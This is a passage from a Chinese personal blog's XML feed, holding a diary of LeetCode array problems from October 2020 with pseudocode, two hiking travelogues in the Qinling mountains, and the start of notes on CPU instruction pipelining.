        <category>学习笔记</category>
        <category>驭龙术</category>
        <category>Java</category>
        <category>Java拾遗</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>面向对象</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode刷题流水账2020-10</title>
    <url>/2020/11/02/%C2%96LeetCode%E5%88%B7%E9%A2%98%E6%B5%81%E6%B0%B4%E8%B4%A62020-10/</url>
    <content><![CDATA[<p>主要是数组, 将官方给的 <a href="https://leetcode-cn.com/leetbook/detail/array-and-string/" target="_blank" rel="noopener">数组字符串</a> 刷完了, 又按照出现频率顺序刷了数组的二十多条,但是(大)部分Hard题目刷不动.</p>
<a id="more"></a>
<h2 id="2020年10月4日"><a href="#2020年10月4日" class="headerlink" title="2020年10月4日"></a>2020年10月4日</h2><h3 id="面试题-01-08-零矩阵"><a href="#面试题-01-08-零矩阵" class="headerlink" title="面试题 01.08. 零矩阵"></a>面试题 01.08. 零矩阵</h3><p>编写一种算法，若M × N矩阵中某个元素为0，则将其所在的行与列清零。</p>
<p>思路: 扫描两遍</p>
<p>第一遍扫描: 新建两个布尔数组(长度为M和N),分别储存矩阵的横纵坐标是否为零</p>
<p>第二遍扫描: 如果元素的对应任意数组元素为真,清零</p>
<h3 id="977-有序数组的平方"><a href="#977-有序数组的平方" class="headerlink" title="[977] 有序数组的平方"></a>[977] 有序数组的平方</h3><p>解法一思路很简单, 先平方再排序</p>
<p>解法2: 使用双指针. 指针从两头逐渐向中间移动. 由于数组递增排序,绝对值两头大中间小. 选择更大的数, 平方后赋值在re数组中(注意要从后向前赋值) </p>
<hr>
<h2 id="2020年10月7日"><a href="#2020年10月7日" class="headerlink" title="2020年10月7日"></a>2020年10月7日</h2><h3 id="75-颜色分类"><a href="#75-颜色分类" class="headerlink" title="[75] 颜色分类"></a>[75] 颜色分类</h3><p>给定一个包含红色、白色和蓝色，一共 n 个元素的数组，原地对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。</p>
<p>此题中，我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。</p>
<p>题目要求不使用库中的排序算法. </p>
<p>解法1: 扫描两次.第一次统计各种元素的个数. 第二次重写数组. 不佳</p>
<p>解法2: 使用双指针. 分别指向第一个1和最后一个1.一次遍历时遇到0 ,与A[p++]交换; 遇到2, 与A[q—]交换.</p>
<p>注意: 解法二中, 如果发生了交换, 那么下一个判断的数组还是A[i], 因此i++不能直接写在for循环的末尾循环语句中! </p>
<h3 id="498-对角线遍历"><a href="#498-对角线遍历" class="headerlink" title="[498]对角线遍历"></a>[498]对角线遍历</h3><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/10/12/diagonal_traverse.png" alt=""></p>
<p>关键点1: 如果元素的横纵坐标之和是偶数, 说明下一个方向是朝着右上角.</p>
<p>关键点2: 针对边界的修正. </p>
<h3 id="14-最长公共前缀"><a href="#14-最长公共前缀" class="headerlink" title="[14]  最长公共前缀"></a>[14]  最长公共前缀</h3><p>这题曾经在2020.09月用CPP实现过. 今天用Java重写了.</p>
<p>以第一个字符串为基准. 对于该串的每个字符是否与后面的所有串的对应位置的字符相同. 如果不同则将该字符前的子串返回.</p>
<hr>
<h2 id="2020年10月9日"><a href="#2020年10月9日" class="headerlink" title="2020年10月9日"></a>2020年10月9日</h2><h3 id="141-环形列表"><a href="#141-环形列表" class="headerlink" title="[141] 环形列表"></a>[141] 环形列表</h3><p>2020年9月份做过了. 使用Java重写.</p>
<p>另外: 逻辑与, 逻辑或具有短路功能. 因此最初的判断只需要</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>
<p>即可! 如果head为空引用类型, 后面对next的判断会被短路. 无需担心. </p>
<hr>
<h2 id="2020年10月15日"><a href="#2020年10月15日" class="headerlink" title="2020年10月15日"></a>2020年10月15日</h2><h3 id="27-移除元素"><a href="#27-移除元素" class="headerlink" title="[27] 移除元素"></a>[27] 移除元素</h3><p>快慢指针 <a href="https://leetcode-cn.com/leetbook/read/array-and-string/cv3bv/" target="_blank" rel="noopener">题解</a></p>
<p>主要问题: 如何判断两个指针的自增条件?</p>
<h3 id="485-最大连续1的个数"><a href="#485-最大连续1的个数" class="headerlink" title="[485] 最大连续1的个数"></a>[485] 最大连续1的个数</h3><p>同样用双指针,注意判断时需要同时判断前一位的值: 相异再执行,相同直接下一个, 最后返回fast-slow即可</p>
<h3 id="209-长度最小的子数组"><a href="#209-长度最小的子数组" class="headerlink" title="[209] 长度最小的子数组"></a>[209] 长度最小的子数组</h3><p>这题写的很难受..又是一看就会一写就废</p>
<blockquote>
<p>给定一个含有 <strong>n</strong> 个正整数的数组和一个正整数 <strong>s ，</strong>找出该数组中满足其和 <strong>≥ s</strong> 的长度最小的 <strong>连续</strong> 子数组，并返回其长度<strong>。</strong>如果不存在符合条件的子数组，返回 0。</p>
</blockquote>
<p>第一次写的暴力就忽略了. 最优方法是滑动窗口(双指针的一种):</p>
<p>思想: 若sum小了 fast后移; 若sum大了, slow后移 在此过程中找最小的</p>
<p>问题: 如何把思想转成代码? 如何再这个过程中找到最小的?</p>
<p>算法: (先自己写 再看这个)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">每一个fast:</span><br><span class="line">if(当前sum较小)</span><br><span class="line">	fast后移</span><br><span class="line">else&#123;</span><br><span class="line">	while(当前sum&gt;&#x3D;s)&#123;</span><br><span class="line">		更新min</span><br><span class="line">		sum中减去slow对应数字</span><br><span class="line">		slow后移</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>TODO: 重写</p>
<h2 id="2020年10月20日"><a href="#2020年10月20日" class="headerlink" title="2020年10月20日"></a>2020年10月20日</h2><h3 id="4-寻找两个正序数组的中位数"><a href="#4-寻找两个正序数组的中位数" class="headerlink" title="[4] 寻找两个正序数组的中位数"></a>[4] 寻找两个正序数组的中位数</h3><p>Hard题</p>
<p>给两个排序数组, 返回合并后的中位数</p>
<p>方法一: 暴力</p>
<p>先合并, 再求中位数; 问题主要转化成了两个正序数组的合并问题.</p>
<p>返回中位数:不会真有人用双指针吧? 判断元素数目的奇偶, 返回 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">个数为奇数: nums[len&#x2F;2]</span><br><span class="line">个数为偶数: (nums[len&#x2F;2] + nums[len&#x2F;2-1]) &#x2F; 2</span><br></pre></td></tr></table></figure>
<h2 id="2020年10月21日"><a href="#2020年10月21日" class="headerlink" title="2020年10月21日"></a>2020年10月21日</h2><h3 id="4-寻找两个正序数组的中位数-1"><a href="#4-寻找两个正序数组的中位数-1" class="headerlink" title="[4] 寻找两个正序数组的中位数"></a>[4] 寻找两个正序数组的中位数</h3><p>方法二:二分查找</p>
<p>在两个数组中进行二分查找,主要的思想还是不变的.(当然写起来问题很多就是了)</p>
<p>建议直接看<a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/solution/xun-zhao-liang-ge-you-xu-shu-zu-de-zhong-wei-s-114/" target="_blank" rel="noopener">官方题解的视频,</a>讲的比较到位</p>
<p>没有太理清楚的点: 在二分查找时,关于奇数的除二,上下取整问题. 以及改变left 和right的时候是<code>i-1</code>,<code>i</code> 还是 <code>i+1</code>呢?</p>
<p><strong>TODO</strong></p>
<h3 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="[11] 盛最多水的容器"></a>[11] 盛最多水的容器</h3><p>双指针. 每次都移动更矮的板子,结果可能更差,但不会错过更好的.</p>
<p>应该是应用很多的思路.</p>
<p>注意: 题目不需要返回最佳时的左右板子,只要最多水的容量即可!</p>
<p>【更新】于2020.11.2 补上证明: 为什么这么做不会错过更大的面积?</p>
<h3 id="53-最大子序和"><a href="#53-最大子序和" class="headerlink" title="[53] 最大子序和"></a>[53] 最大子序和</h3><p>在九月份时写过C++版本的. 这题主要是动态规划.当时的笔记较为详细.请移步.</p>
<h2 id="2020年10月23日"><a href="#2020年10月23日" class="headerlink" title="2020年10月23日"></a>2020年10月23日</h2><h3 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="[15] 三数之和"></a>[15] 三数之和</h3><p>终于到了久仰大名的三数之和.这是一条非常经典的双指针题目.</p>
<blockquote>
<p>给定一数组, 找出所有满足和为0的三元组,不能重复.</p>
</blockquote>
<p>思路如下: </p>
<p>对于每一个<code>a</code>, 要使得<code>b+c = -a</code>. 我们可以在将<code>b</code>从小到大的同时将<code>c</code>从大到小, 也就是第二重循环和第三重循环实际上是并列的.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们选出的数分别是a,b,c, 它们在数组中的位置分别是first,second,third</span><br><span class="line">sort(nums)</span><br><span class="line">for first &#x3D; 0..n-1</span><br><span class="line">	if(a不是第一个 &amp;&amp; a与nums[first-1]一样)</span><br><span class="line">		continue</span><br><span class="line">		&#x2F;&#x2F;为了保证不重复</span><br><span class="line">	target &#x3D; -1 * a		&#x2F;&#x2F;对于这个a,b+c应该等于target</span><br><span class="line">	third &#x3D; n-1</span><br><span class="line">	second &#x3D; first+1</span><br><span class="line">	&#x2F;&#x2F;并列执行二,三重循环,或者说是双指针</span><br><span class="line">	for second &#x3D; first+1 .. n-1</span><br><span class="line">            if(b不是a后第一个 &amp;&amp; b与nums[second-1]一样)</span><br><span class="line">                continue</span><br><span class="line">                &#x2F;&#x2F;为了保证不重复</span><br><span class="line">            while nums[first]+nums[second]+nums[third] &gt; 0</span><br><span class="line">                third &#x3D; third-1</span><br><span class="line">            &#x2F;&#x2F; 判断是否有 a+b+c&#x3D;&#x3D;0</span><br><span class="line">            check(first, second, third)</span><br></pre></td></tr></table></figure>
<p>当然,这里还可以有一些常数级的优化. 略过不表.</p>
<p>原本的复杂度是<code>O(n^3)</code>. 现在的复杂度是<code>O(N^2)</code></p>
<blockquote>
<p>这个方法就是我们常说的「双指针」，当我们需要枚举数组中的两个元素时，如果我们发现随着第一个元素的递增，第二个元素是递减的，那么就可以使用双指针的方法，将枚举的时间复杂度从 <code>O(N^2)</code>) 减少至 O(N)O(N)。为什么是<code>O(N)</code> 呢？这是因为在枚举的过程每一步中，「左指针」会向右移动一个位置（也就是题目中的 bb），而「右指针」会向左移动若干个位置，这个与数组的元素有关，但我们知道它一共会移动的位置数为<code>O(N)</code>，均摊下来，每次也向左移动一个位置，因此时间复杂度为 <code>O(N)</code>。</p>
<p>注意到我们的伪代码中还有第一重循环，时间复杂度为 <code>O(N)</code>，因此枚举的总时间复杂度为 <code>O(N^2)</code><br>)。由于排序的时间复杂度为 <code>O(N log N)</code>)，在渐进意义下小于前者，因此算法的总时间复杂度为<code>O(N^2)</code>。</p>
</blockquote>
<h3 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="[121] 买卖股票的最佳时机"></a>[121] 买卖股票的最佳时机</h3><p>二刷,一条简单的<code>dp</code> 存储目前的最低价和最大收益</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i &#x3D; 0..n-1</span><br><span class="line">	if(curr&lt;minPrice) minPrice&#x3D;curr;</span><br><span class="line">	if(curr-minPrice&gt;maxProfit) maxProfit&#x3D;curr-minPrice;</span><br></pre></td></tr></table></figure>
<h2 id="2020年10月24日"><a href="#2020年10月24日" class="headerlink" title="2020年10月24日"></a>2020年10月24日</h2><h3 id="42-接雨水"><a href="#42-接雨水" class="headerlink" title="[42] 接雨水"></a>[42] 接雨水</h3><ol>
<li><p>暴力: 对于每个高度h,找到左边最lm,和右边最大的数rm. 取min(lm,rm)-h的值,若大于0则累计.</p>
<p>问题在于: 每个高度都要左右扫描一遍 O(n^2)</p>
</li>
<li><p>动态编程</p>
<p>先扫描两边,记录每个h的<code>leftMaxVol[]</code>, <code>rightMaxVol[]</code></p>
<p>遍历每个高度时,只需要拿两个数组对应的值即可. </p>
</li>
<li><p>双指针</p>
<p>很巧妙, </p>
<p>定理一：在某个位置<code>i</code>处，它能存的水，取决于它左右两边的最大值中较小的一个。</p>
<p>定理二：当我们从左往右处理到left下标时，左边的最大值left_max对它而言是可信的，但right_max对它而言是不可信的。（见下图，由于中间状况未知，对于left下标而言，right_max未必就是它右边最大的值）</p>
<p>定理三：当我们从右往左处理到right下标时，右边的最大值right_max对它而言是可信的，但left_max对它而言是不可信的。</p>
<p>对于位置<code>left</code>而言，它左边最大值一定是left_max，右边最大值“大于等于”right_max，这时候，如果<code>left_max&lt;right_max</code>成立，那么它就知道自己能存多少水了。无论右边将来会不会出现更大的right_max，都不影响这个结果。 所以当<code>left_max&lt;right_max</code>时，我们就希望去处理left下标，反之，我们希望去处理right下标。</p>
</li>
</ol>
<h3 id="238-除自身以外数组的乘积"><a href="#238-除自身以外数组的乘积" class="headerlink" title="[238] 除自身以外数组的乘积"></a>[238] 除自身以外数组的乘积</h3><p>题目不让使用除法</p>
<p>和42题类似,先遍历两边, 算出前缀积和后缀积,再第三次遍历的时候相乘.</p>
<p>空间都复杂度的优化:</p>
<p>前缀积可以不用数组, 而用一个整数在最终遍历的时候动态维护. 那么后缀积怎么优化呢? 很鸡贼, 因为题目说不考虑返回数组的空间, 所以把遍历的后缀积放在<code>ans[]</code>数组中…..</p>
<h2 id="2020年10月27日"><a href="#2020年10月27日" class="headerlink" title="2020年10月27日"></a>2020年10月27日</h2><h3 id="16-最接近的三数之和"><a href="#16-最接近的三数之和" class="headerlink" title="[16] 最接近的三数之和"></a>[16] 最接近的三数之和</h3><p>啊这, 其实和<a href="https://leetcode-cn.com/problems/3sum/" target="_blank" rel="noopener">[15]三数之和</a>基本是完全一致的思路。请直接参照10月23日的笔记。</p>
<p>常数级优化：若<code>first!=0 &amp;&amp; nums[first]==nums[first-1]</code>, 可直接<code>continue</code>；若<code>tmp3sum == target</code>,可直接返回，因为没有比自身更接近自身的数了。</p>
<h3 id="31-下一个排列"><a href="#31-下一个排列" class="headerlink" title="[31] 下一个排列"></a>[31] 下一个排列</h3><p>TODO 这条做的磕磕绊绊的，值得回头再做。比较考验思维。</p>
<p>可以直接看 <a href="https://leetcode-cn.com/problems/next-permutation/solution/xia-yi-ge-pai-lie-by-leetcode/" target="_blank" rel="noopener">题解</a>。关键点在于：找出规律。先从全降序的入手，找到交换点，最后考虑到逆序。</p>
<p>说几个容易错的点</p>
<ol>
<li>长度为1的边缘情况</li>
<li>如果全降序，需要全逆序</li>
<li>找第二个交换点时，要考虑到<code>nums[a]==nums[b-1]</code>相等的情况。例如 1，5，1；应该是 <code>1,5</code>交换，不是<code>1,1</code>交换</li>
</ol>
<h2 id="2020年10月28日"><a href="#2020年10月28日" class="headerlink" title="2020年10月28日"></a>2020年10月28日</h2><h3 id="289-生命游戏"><a href="#289-生命游戏" class="headerlink" title="[289] 生命游戏"></a>[289] 生命游戏</h3><p>大名鼎鼎的细胞自动机. 题目本身不难, 关键是如何将规则提取为判断式；同时对规则尽可能地化简。</p>
<ol>
<li>如果活细胞周围八个位置的活细胞数少于两个，则该位置活细胞死亡；</li>
<li>如果活细胞周围八个位置有两个或三个活细胞，则该位置活细胞仍然存活；</li>
<li>如果活细胞周围八个位置有超过三个活细胞，则该位置活细胞死亡；</li>
<li>如果死细胞周围正好有三个活细胞，则该位置死细胞复活；</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for each&#123;</span><br><span class="line">	int livesAround &#x3D; countLivesCellAround();</span><br><span class="line">	ChangeStatus();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么关键问题就变成了，如何计数？又如何改变？有以下问题</p>
<ol>
<li><p>如果仅仅使用1/0，那么最大的问题在于，计数时左上方的状态已经被更改过了。</p>
</li>
<li><p>对于上一条，我们可以将原始数组实现储存一份。但是空间开销大。</p>
</li>
<li><p>我们还可以拓展状态为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: 00 死-&gt;死 </span><br><span class="line">1: 01 活-&gt;死 </span><br><span class="line">2: 10 死-&gt;活 </span><br><span class="line">3: 11 活-&gt;活</span><br></pre></td></tr></table></figure>
</li>
<li><p>这样子，如果当前细胞死亡，状态无需改变；如果继续存活，1-&gt;3；如果细胞复活，0-&gt;2</p>
</li>
</ol>
<p>以上就是本题的主要思路了。</p>
<p>下面介绍一下二位矩阵中，统计周围单元格时对于边界的简便处理手段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int[] dx &#x3D; &#123; -1, -1, -1, 0, 0, 1, 1, 1 &#125;;</span><br><span class="line">int[] dy &#x3D; &#123; -1, 0, 1, -1, 1, -1, 0, 1 &#125;;</span><br><span class="line"></span><br><span class="line">for each&#123;</span><br><span class="line">	int nx &#x3D; row + dx[i];</span><br><span class="line">    int ny &#x3D; col + dy[i];</span><br><span class="line">    if (nx &lt; 0 || nx &gt;&#x3D; rows || ny &lt; 0 || ny &gt;&#x3D; cols) &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    	&#x2F;&#x2F; 正常操作</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2020年10月29日"><a href="#2020年10月29日" class="headerlink" title="2020年10月29日"></a>2020年10月29日</h2><h3 id="442-数组中重复的数据"><a href="#442-数组中重复的数据" class="headerlink" title="[442] 数组中重复的数据"></a>[442] 数组中重复的数据</h3><blockquote>
<p>给定一个整数数组 a，其中1 ≤ a[i] ≤ <em>n</em> （<em>n</em>为数组长度）, 其中有些元素出现<strong>两次</strong>而其他元素出现<strong>一次</strong>。</p>
<p>找到所有出现<strong>两次</strong>的元素。</p>
</blockquote>
<p> 思考: 考虑到1 ≤ a[i] ≤ n ,那么应该是一一对应的. </p>
<p>问题:如何将这个信息存储在原有的数组中?能否不影响数组本身信息的存储?</p>
<p>答:由于数字都是正数,我们可以利用符号的转变来存储这一二进制信息(正:未遇见过,负:已遇见过)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for each&#123;</span><br><span class="line">	index &#x3D; nums[i]-1	&#x2F;&#x2F;index是索引,数字范围1~n,对于0~n-1</span><br><span class="line">	if(nums[index]&gt;0)</span><br><span class="line">		nums[index] * -1</span><br><span class="line">	else</span><br><span class="line">		&#x2F;&#x2F;说明出现过,添加进结果		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2020年10月30日"><a href="#2020年10月30日" class="headerlink" title="2020年10月30日"></a>2020年10月30日</h2><h3 id="41-缺失的第一个正数"><a href="#41-缺失的第一个正数" class="headerlink" title="[41] 缺失的第一个正数"></a>[41] 缺失的第一个正数</h3><p>利用正负来标记信息</p>
<p><a href="https://leetcode-cn.com/problems/first-missing-positive/solution/que-shi-de-di-yi-ge-zheng-shu-by-leetcode-solution/" target="_blank" rel="noopener">官方题解</a></p>
<h5 id="TODO-重做"><a href="#TODO-重做" class="headerlink" title="TODO 重做"></a>TODO 重做</h5><h3 id="88-合并两个有序数组"><a href="#88-合并两个有序数组" class="headerlink" title="[88] 合并两个有序数组"></a>[88] 合并两个有序数组</h3><p>二刷, 很简单的双指针题目. 从后往前指针移动即可.注意一下其中一个数组完成后将后续部分如何放进去</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>屠龙术</category>
        <category>算法与刷题</category>
        <category>力扣刷题流水账</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>山与水-漫步秦岭之雪中光头峰</title>
    <url>/2020/10/21/%E5%B1%B1%E4%B8%8E%E6%B0%B4-%E6%BC%AB%E6%AD%A5%E7%A7%A6%E5%B2%AD%E4%B9%8B%E9%9B%AA%E4%B8%AD%E5%85%89%E5%A4%B4%E5%B3%B0/</url>
    <content><![CDATA[<p>2020年10月17日</p>
<p>公里数14.69KM,海拔2838M</p>
<a id="more"></a>
<p>国庆收假以来一直是阴雨连绵的天气,真是烦死人了. 衣服晒不干, 裤脚又容易沾的满是泥点子.好不容易熬来一个晴天, 又准备去光头山上, 看看雪后初霁.</p>
<p>注：下图是在光头山拍的别的山头，右边是鹿角梁</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/22/%E8%BF%9C%E6%99%AF.jpg" alt=""></p>
<h2 id="雪"><a href="#雪" class="headerlink" title="雪"></a>雪</h2><p>万万万万没想到失策了。雪倒是看到了，初霁也差不多，结果两者相遇，山上本来就薄薄的一层积雪全化成雪水，沿着山间的各个角落流下。倘若只是山泉泛滥，小溪充盈也罢，麻烦的是脚下的土路表面也湿哒哒地黏脚，泥泞之处也不在少数。</p>
<p>对了，其实也有不少地方，平日里只是涓涓细流，今天全成了一道道小瀑布。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/22/%E6%B3%89%E6%B0%B4.jpg" alt=""></p>
<h2 id="路"><a href="#路" class="headerlink" title="路"></a>路</h2><p>可分为三段：最初坡度尚可，道路隐约有些湿滑，由山脚葱郁到落叶青黄相间，铺在地上，虽然没有学校的银杏地毯好看，也是很养眼；中间一段来回穿过小竹林，非得弯腰低头才能穿过，稍有不小心竹枝便抽打在脸上，生疼。竹林也就算了，最讨厌的是带刺的灌木，扎进手指非流血不可；最后上了雪线，周遭只剩下低矮的草甸和零星的松树，遥望山顶的红房子真是遥不可及，雪落的很深，能没过脚面，难走。</p>
<p>大雪压青松，青松挺且直</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/22/%E6%9D%BE%E6%A0%91.jpg" alt=""></p>
<p>层林尽染</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/22/%E5%B1%B1%E6%99%AF.jpg" alt=""></p>
<h2 id="石"><a href="#石" class="headerlink" title="石"></a>石</h2><p>光头山虽然本身景色不佳，但山顶的几块石头是真出片。会当凌绝顶，一览众山小！</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/22/%E7%9F%B3%E5%A4%B43.jpg" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/22/%E7%9F%B3%E5%A4%B41.jpg" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/22/%E7%9F%B3%E5%A4%B42.jpg" alt=""></p>
]]></content>
      <categories>
        <category>山与水</category>
        <category>不积硅步</category>
      </categories>
      <tags>
        <tag>游记</tag>
        <tag>漫步秦岭##可选</tag>
      </tags>
  </entry>
  <entry>
    <title>山与水-漫步秦岭之二刷子午</title>
    <url>/2020/09/27/%E5%B1%B1%E4%B8%8E%E6%B0%B4-%E6%BC%AB%E6%AD%A5%E7%A7%A6%E5%B2%AD%E4%B9%8B%E4%BA%8C%E5%88%B7%E5%AD%90%E5%8D%88/</url>
    <content><![CDATA[<p>2020年9月26日</p>
<p>子午口-荔枝驿-金仙观-小土地梁-原返</p>
<a id="more"></a>
<p>由于我坚持不懈地在朋友圈更新徒步动态, 终于有同学跑过来私聊说想试一试户外了~ 正好本周的打卡山是难度较大的冰晶顶, 自觉水平不够, 就带着N同学一起去了超简单线:子午峪. 子午是我疫情返校后的第一座山, (可以参看8月5日的游记), 对新手非常友好了~</p>
<h2 id="新队友"><a href="#新队友" class="headerlink" title="新队友"></a>新队友</h2><p>让我惊讶的是居然在队伍里偶遇到西电的本科生. 是一位17级的大四学长, 在此之前我几乎没有碰到过玩户外的其他本科生欸. 事后发现跃跃学长真是dalao哈哈哈. 这个一会再说</p>
<p>集合点是陕师大门口. 副领队是一只看上去好小的政法小姐姐 , 居然也是大三. 虽说明明也是户外新人怎么就成领队了呢(狗头</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202009/%E9%87%91%E4%BB%99%E8%A7%82.jpg" alt=""></p>
<p>主领队是西电的研究生非鱼. 很皮很欠揍. 提前就约好了一起腐败哈哈哈</p>
<p>除此之外还有个巨巨巨巨佬Black, 是交大的研究生. 越野老驴, 体能贼强, 回去路上给我们看之前反穿鳌太, 一日太白的照片, 实在是太好看了. 高强度徒步. 除此之外科研生活也两开花, 大佬果然做什么事情都是大佬.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202009/%E7%8E%AF%E4%BF%9D.jpg" alt=""></p>
<h2 id="徒步"><a href="#徒步" class="headerlink" title="徒步"></a>徒步</h2><p>一路上倒是没什么值得记录的, 跟散步一样慢悠悠晃了过来, 没啥景色.</p>
<p>倒是有队员拍到了山羊的照片,可惜我没看到.还有第一次来的时候见到的猫猫, 两个月不见又胖了一圈</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202009/%E7%8C%AB%E5%92%AA.jpg" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202009/%F0%9F%90%8F.jpg" alt=""></p>
<p>有段路满地都是野板栗壳, 都是先前的徒步队留下来的, 我们瞪大了眼睛也找不到一个完整的, 不过回来路上看见别的驴友拎着一大袋子板栗回去, 估计是进山进的更深一些.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202009/%E6%9D%BF%E6%A0%97%28%E5%B0%8F%29.jpg" alt=""></p>
<h2 id="腐败"><a href="#腐败" class="headerlink" title="腐败"></a>腐败</h2><p>那这种轻装休闲线嘛~ 肯定是主要出来腐败的. 提前准备好了海底捞底料, 火腿, 肉肠, 鸡胸肉, 方便面. 甚至还在乐购买了包牛肉卷(容易化, 下次别带了). 其他人也带了两袋子菜蔬, 火锅丸子, 爆浆蛋糕, 鸭脖鸭架, 炒货等待…非鱼还带的一口大锅! 第一次吃这么丰盛的火锅哈哈哈. 最后煮了一盆肉,一盆菜,一盆方便面. 到最后都九个人都没能吃完!!</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202009/%E7%81%AB%E9%94%85.jpg" alt=""></p>
<p>跃跃原来是厨神, 油炸火腿肠(虽然不好吃), 番茄汤底方便面, 最后甚至掏出了一套茶具开始喝茶! 真的绝了~~</p>
<p>回去路上又临时起意去约饭, 居然还是去的自助~! 感觉这一趟下来胖好多哈哈哈</p>
<p>但是自助真好吃</p>
<blockquote>
<p>还记得去年说, 旅游的意义之一是简单更多的人更广的世界，现在觉得这句话更加正确。</p>
<p>拘泥于固有的生活节奏的人是井底之蛙，是动了奶酪而不自知的老鼠。</p>
<p>遇到了交大大佬black，体能好 徒步越野的老驴，文理双修，博闻强识 科研生活两开花<br>遇到了同龄的政法小姐姐，虽然也在迷茫但是很努力在提升自己<br>遇到大一届的学长，在毕业和求职之间忙里偷闲<br>遇到78年高考的大叔，交大毕业，扬州工作，还能跟我们唠的开心</p>
<p>缘分这种事啊，不迈出第一步就永远也碰不见</p>
</blockquote>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202009/%E5%90%88%E7%85%A7.jpg" alt=""></p>
]]></content>
      <categories>
        <category>山与水</category>
        <category>不积硅步</category>
      </categories>
      <tags>
        <tag>游记</tag>
        <tag>漫步秦岭</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机组成之流水线</title>
    <url>/2020/10/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%8B%E6%B5%81%E6%B0%B4%E7%BA%BF/</url>
    <content><![CDATA[<ul>
<li>流水线概述<ul>
<li>定义与原理</li>
<li>时空图表示</li>
<li>分类</li>
</ul>
</li>
<li>流水线性能<ul>
<li>吞吐率</li>
<li>加速比</li>
<li>效率</li>
</ul>
</li>
<li>相关<ul>
<li>相关的定义</li>
<li>结构相关</li>
<li>数据相关</li>
<li>控制相关</li>
<li>中断</li>
<li>处理</li>
</ul>
</li>
<li>指令级并行</li>
<li>其他技术</li>
</ul>
<a id="more"></a>
<h2 id="流水线概述"><a href="#流水线概述" class="headerlink" title="流水线概述"></a>流水线概述</h2><h3 id="定义与原理"><a href="#定义与原理" class="headerlink" title="定义与原理"></a>定义与原理</h3><p>定义: 将一重复的处理过程分解为若干子过程，每个 子过程都可有效地在其专用功能段上与其它子 过程同时执行，这种技术称为流水线技术.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/%E6%B4%97%E8%A1%A3%E5%BA%971.png" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/%E6%B4%97%E8%A1%A3%E5%BA%972.png" alt=""></p>
<ul>
<li>在流水线中, 单个任务的时间并没有缩短，但多个任务是并行处理的.因此可以提高吞吐率； </li>
<li>流水线速度限制于最慢流水站的速度</li>
<li>理论上, 流水线技术的最大加速比=流水站数</li>
</ul>
<ul>
<li>流水过程由多个相关的子过程组成，这些子过程称为流水线的“级”或“段”。段的数目称为流水线 的“深度”。 </li>
<li>每个子过程由专用的功能段实现，各功能段的时间 应基本相等</li>
<li>流水线需要经过一定的通过时间才能稳定,因此适合于大量重复的时序过程</li>
</ul>
<h3 id="时空图"><a href="#时空图" class="headerlink" title="时空图"></a>时空图</h3><p>时空图是用于描述流水线技术的一种表示图. 从时间和空间两个方面描述流水线的工作过程，横坐 标表示时间，纵坐标表示各流水段。</p>
